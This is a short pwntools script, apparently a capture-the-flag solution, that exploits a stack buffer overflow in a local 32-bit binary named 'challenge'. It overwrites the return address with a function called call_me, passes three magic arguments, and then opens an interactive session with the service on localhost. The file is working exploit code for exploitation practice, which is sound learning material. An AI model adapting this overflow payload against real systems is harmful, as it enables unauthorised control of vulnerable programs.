from pwn import *

context.binary = elf = ELF("./challenge")
context.log_level = "debug"

call_me_addr = elf.symbols["call_me"]
log.info(f"call_me() address: {hex(call_me_addr)}")

arg1 = 0xDEADBEEF
arg2 = 0xCAFEBABE
arg3 = 0x8BADF00D

offset = 76
payload = b"A" * offset
payload += p32(call_me_addr)
payload += b"JUNK"
payload += p32(arg1) + p32(arg2) + p32(arg3)

# p = elf.process()
p = remote("127.0.0.1", 6789)

p.recvuntil(b"Enter some data: ")
p.sendline(payload)

p.interactive()
